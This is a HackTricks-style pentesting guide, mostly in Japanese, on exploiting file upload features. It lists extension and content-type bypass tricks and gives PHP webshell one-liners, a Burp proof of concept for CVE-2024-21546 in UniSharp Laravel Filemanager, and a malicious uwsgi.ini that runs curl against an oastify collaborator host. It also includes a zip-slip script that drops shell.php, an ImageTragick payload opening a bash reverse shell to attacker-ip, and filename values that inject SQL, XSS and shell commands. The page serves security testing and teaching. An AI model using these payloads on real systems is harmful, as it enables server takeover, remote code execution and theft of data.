# ファイルアップロード

{{#include ../../banners/hacktricks-training.md}}

## File Upload General Methodology

その他の有用な拡張子:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. 適用される場合、**前述の拡張子を確認**してください。大文字小文字を混ぜてテストすることも有効です: _pHp, .pHP5, .PhAr ..._
2. _実行用の拡張子の前に有効な拡張子を追加してチェックする（前述の拡張子も使用）:_
- _file.png.php_
- _file.png.Php5_
3. ファイル名の末尾に**特殊文字を追加**してみてください。Burp を使ってすべての **ascii** や **Unicode** 文字を**ブルートフォース**するのも有効です。(_前述した**拡張子**を使って試すこともできます_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. サーバ側の拡張子パーサを騙して保護を回避する方法（拡張子を二重にする、拡張子間にジャンクデータや**null**バイトを挟むなど）を試してください。_より良いペイロードを作るために前述の拡張子も使えます。_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. さらに層を追加してチェック:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. 実行用の拡張子を有効な拡張子の前に置いて、サーバが誤設定されていることを期待してみる。（Apache の誤設定を突くのに有用で、拡張子が** _**.php**_** を含むものは必ずしも .php で終わらなくてもコードが実行される場合がある）
- _ex: file.php.png_
7. **Windows** の NTFS alternate data stream (ADS) を利用する。禁止された拡張子の後、許可された拡張子の前にコロン ":" を挿入します。その結果、サーバ上に**禁止された拡張子を持つ空ファイル**が作成されることがあります（例: "file.asax:.jpg”）。このファイルは後で short filename など他の手法で編集できる可能性があります。"**::$data**” パターンを使うと非空のファイルを作成することもできます。したがって、このパターンの後にドットを追加することもさらなる制限回避に有効です（例: "file.asp::$data.”）
8. ファイル名長の制限を破ることを試す。正しい拡張子が切り捨てられ、悪意のある PHP 部分が残る可能性があります。AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

一部の upload handler は保存時にファイル名の末尾のドットをトリムまたは正規化します。UniSharp の Laravel Filemanager (unisharp/laravel-filemanager) バージョン 2.9.1 未満では、次の手順で拡張子検証をバイパスできます:

- PNG の `\x89PNG\r\n\x1a\n` のような有効な image MIME と magic header を使用する。
- アップロードするファイル名を PHP 拡張子の後にドットを付けて命名する（例: `shell.php.`）。
- サーバは末尾のドットを削除して `shell.php` として保存し、公開ディレクトリ（デフォルトの public storage 例: /storage/files/）に配置されれば実行されます。

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
次に保存されたパスにアクセスします (Laravel + LFMで典型的です):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- unisharp/laravel-filemanager を ≥ 2.9.1 にアップグレードする。
- サーバー側で厳格な allowlists を強制し、永続化されたファイル名を再検証する。
- アップロードを非実行可能な場所から配信する。

### Bypass Content-Type, Magic Number, Compression & Resizing

- **Content-Type** チェックは、**Content-Type** **header** の **value** を次のように設定してバイパスできます: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** チェックは、ファイルの先頭に **bytes of a real image** を追加して（_file_ コマンドを混乱させる）バイパスできます。あるいは **metadata** にシェルを埋め込む：\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
またはペイロードを画像に**直接埋め込む**こともできます：\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- もし画像に **圧縮が適用されている**（例えば [PHP-GD](https://www.php.net/manual/fr/book.image.php) のような標準的な PHP ライブラリを使っている）場合、前述の手法は有効でないことがあります。しかし、**PLTE chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、**圧縮を生き残る**テキストを挿入できます。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- ウェブページが例えば PHP-GD の `imagecopyresized` や `imagecopyresampled` 関数を使って **画像をリサイズ** している場合があります。しかし、**IDAT chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、**圧縮を生き残る**テキストを挿入できます。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 画像のリサイズ（PHP-GD の `thumbnailImage` を使用するなど）を生き残るペイロードを作る別の手法もありますが、**tEXt chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、**圧縮を生き残る**テキストを挿入できます。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- アップロード済みファイルの拡張子を変更するために **rename** できる脆弱性を探す。
- バックドアを実行するための **Local File Inclusion** 脆弱性を探す。
- **情報漏洩の可能性**:
1. 同じ名前の **同一ファイル** を **複数回**（かつ **同時に**）アップロードする。
2. 既に存在する **ファイル** や **フォルダ** と同じ **名前** のファイルをアップロードする。
3. 名前が **"."、".."、または "..."** のファイルをアップロードする。例えば、Apache on **Windows** でアプリケーションがアップロードファイルを "/www/uploads/" に保存する場合、"." というファイル名は "/www/" に "uploads" というファイルを作成してしまう。
4. **NTFS** 上で **"…:.jpg"** のように削除しづらいファイルをアップロードする。（Windows）
5. **Windows** で名前に `|<>*?”` のような **無効な文字** を含むファイルをアップロードする。（Windows）
6. **Windows** で CON, PRN, AUX, NUL, COM1…COM9, LPT1…LPT9 のような **予約（禁止）名** を使ってファイルをアップロードする。
- 被害者が誤って開いたときにコードを実行するような、.exe のような **実行可能ファイル** や、より怪しまれにくい **.html** をアップロードしてみる。

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` ファイルは Java の `.jar` に似ており php 用で、**php ファイルのように使える**（php で実行したり、スクリプト内で include したりできる）。

`.inc` 拡張子はファイルのインポートに使われる php ファイルに使われることがあり、場合によってはこの拡張子が実行されるように許可されていることがある。

## **Jetty RCE**

Jetty サーバーに XML ファイルをアップロードできると、[RCE を得られる（**new \*.xml and \*.war are automatically processed**）](https://twitter.com/ptswarm/status/1555184661751648256/photo/1) 可能性があります。したがって、次の画像にあるように XML ファイルを `$JETTY_BASE/webapps/` にアップロードすればシェルを得られます！

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) 脆弱性は、`.ini` 設定ファイルを改変できる場合に uWSGI サーバーで悪用され得ます。uWSGI の設定ファイルは "magic" な変数、プレースホルダ、演算子を取り込む特有の構文を持ちます。特に '@' 演算子（`@(filename)` の形式）はファイルの内容をインクルードするために使われます。uWSGI がサポートするさまざまなスキームの中で、"exec" スキームは特に強力で、プロセスの標準出力からデータを読み取ることが可能です。この機能は、`.ini` 設定ファイルが処理される際に、Remote Command Execution や Arbitrary File Write/Read といった悪用に利用され得ます。

次に示すのは、さまざまなスキームを示す悪意ある `uwsgi.ini` ファイルの例です：
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
payload の実行は設定ファイルの解析時に発生します。設定が有効化され解析されるには、uWSGI プロセスを再起動する（クラッシュ後や Denial of Service attack による場合など）か、ファイルが auto-reload に設定されている必要があります。auto-reload 機能が有効な場合、変更を検知すると指定した間隔でファイルを再読み込みします。

uWSGI の設定ファイル解析が緩いことを理解することが重要です。具体的には、ここで述べた payload はバイナリファイル（image や PDF など）に埋め込むことができ、悪用の範囲をさらに広げます。

## **wget ファイルアップロード/SSRF トリック**

場合によってはサーバが **`wget`** を使用して **download files** を行い、あなたが **indicate** できる **URL** を指定できることがあります。こうした場合、コードはダウンロードされるファイルの拡張子がホワイトリスト内にあるかをチェックして、許可されたファイルのみがダウンロードされるようにしていることがあります。しかし、**this check can be bypassed.**\ **linux** における **filename** の **maximum** 長さは **255** ですが、**wget** はファイル名を **236** 文字に切り詰めます。例えば、**download a file called "A"\*232+".php"+".gif"** といったファイルをダウンロードすると、このファイル名は（この例では **".gif"** が **valid** な拡張子であるため）**bypass** して **check** を通過しますが、`wget` はファイル名を **"A"\*232+".php"** に **rename** します。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **別のオプション** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **動作しません** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## ツール

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### snprintf の挙動の違いによる upload インデックスの破損（historical）

単一ファイルのアップロードからマルチファイル配列を構築するために `snprintf()` や類似の関数を使用する一部のレガシーなアップロードハンドラは、`_FILES` 構造を偽造されるように騙されることがあります。`snprintf()` の挙動における不整合や切り捨てのため、巧妙に作られた単一のアップロードがサーバ側で複数のインデックス付きファイルとして現れ、厳密な形状を想定したロジック（例：マルチファイルアップロードとして扱い、安全でない分岐を取る）を混乱させます。今日ではニッチですが、この “index corruption” パターンは時折 CTF や古いコードベースで再出現します。

## ファイルアップロードから派生するその他の脆弱性

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## マジックヘッダバイト

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar ファイルの自動解凍アップロード

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

シンボリックリンクを含むアーカイブをアップロードすると、解凍後にその展開されたファイルにアクセスすることでリンク先のファイルへアクセスできます：
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 異なるフォルダに解凍

解凍中にディレクトリ内にファイルが意図せず作成されることは重大な問題です。この構成が悪意あるファイルアップロードによるOSレベルのコマンド実行を防ぐと最初は想定されても、ZIPアーカイブ形式の階層的な圧縮サポートとディレクトリトラバーサル機能が悪用され得ます。これにより、攻撃者は対象アプリケーションの解凍機能を操作して制限を回避し、安全なアップロードディレクトリから脱出できます。

そのようなファイルを生成する自動化エクスプロイトは[**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)で入手できます。ユーティリティの使用例は以下のとおりです：
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
また、**symlink trick with evilarc** は選択肢の一つです。もしターゲットが `/flag.txt` のようなファイルであれば、そのファイルへの symlink をシステム上に作成しておくべきです。これにより evilarc が動作中にエラーを発生させないようにできます。

以下は、悪意のある zip ファイルを作成するために使用される Python コードの例です:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**圧縮の悪用による file spraying**

詳しくは **元記事を確認してください**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHPコードは `$_REQUEST` 変数を通じて渡されたコマンドを実行するように書かれています。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 複数のファイルが作成され、それらを含むzipアーカイブが組み立てられます。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip内のファイル名をviやhexエディタで変更し、"xxA" を "../" に置換してディレクトリを遡ります。

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

この内容を画像拡張子でアップロードして脆弱性を悪用します **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNGにPHPシェルを埋め込む

PNGファイルのIDATチャンクにPHPシェルを埋め込むことで、特定の画像処理を回避できる場合があります。PHP-GDの`imagecopyresized`や`imagecopyresampled`といった関数は、それぞれ画像のリサイズやリサンプリングで一般的に使われるため、この文脈で特に重要です。埋め込まれたPHPシェルがこれらの処理によって影響を受けずに残ることは、特定のユースケースで大きな利点となります。

この手法の詳細な解説（手順や応用例を含む）は、次の記事にまとめられています: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。このリソースはプロセスとその影響を包括的に理解するのに役立ちます。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot filesは複数のファイルフォーマットとして同時に有効であり得る「カメレオン」的なツールです。興味深い例としては、GIFとRARのハイブリッドである[GIFAR](https://en.wikipedia.org/wiki/Gifar)があります。これらはGIFとRARの組み合わせに限らず、GIFとJSやPPTとJSのような組み合わせも可能です。

polyglotの主な利点は、ファイルタイプに基づく検査を回避できる点にあります。多くのアプリケーションでは、アップロードをJPEGやGIF、DOCなどの特定のファイルタイプに限定して、JSやPHP、Pharのような危険な形式を防ごうとします。しかし、polyglotは複数のファイルタイプの構造要件を満たすことで、これらの制限を巧妙にすり抜けることができます。

ただし、polyglotにも制約はあります。例えば、PHAR（PHp ARchive）とJPEGを同時に兼ねるpolyglotであっても、アップロードの可否はプラットフォームの拡張子ポリシーに依存する場合があります。システムが許可される拡張子に厳格な場合、polyglotの構造的二面性だけではアップロードが保証されないことがあります。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDFのように見せかけて有効なJSONをアップロードする方法

有効なJSONファイルを、あたかもPDFであるかのように偽装してアップロードし、ファイルタイプ検出を回避する方法（**[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** の手法）:

- **`mmmagic` library**: 最初の1024バイト内に`%PDF`のマジックバイトがあれば有効と見なされる（投稿の例を参照）
- **`pdflib` library**: JSONのフィールド内に偽のPDFフォーマットを追加することでライブラリがPDFだと判断する（投稿の例を参照）
- **`file` binary**: ファイルから最大1048576バイトを読み取れる。JSONをそれより大きく作成して中身をJSONとして解析できなくし、そのJSON内に実際のPDFの先頭部分を入れれば、PDFだと判断される

## 参考資料

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
